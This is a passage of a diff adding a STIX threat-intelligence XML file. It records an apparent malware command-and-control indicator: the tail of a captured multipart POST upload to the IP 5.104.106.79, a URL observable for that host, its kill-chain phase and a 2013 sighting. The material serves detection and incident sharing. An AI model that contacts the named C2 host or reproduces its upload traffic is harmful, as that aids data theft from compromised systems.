+Host: 5.104.106.79
+Connection: close
+Cache&#8208;Control: no&#8208;cache
+Content&#8208;Length: 452
+
+&#8208;&#8208;113039734
+Content&#8208;Disposition: form&#8208;data; name="data"; filename="2322607230"
+Content&#8208;Type: application/octet&#8208;stream
+------END POST REQUEST------</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-38675811-6b8e-439f-84d9-ab5ea67782b1">
+        <cybox:Object id="CISCP:Object-785ab097-7389-40a3-9bd1-b9e7fc60444c">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://5.104.106.79:80/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
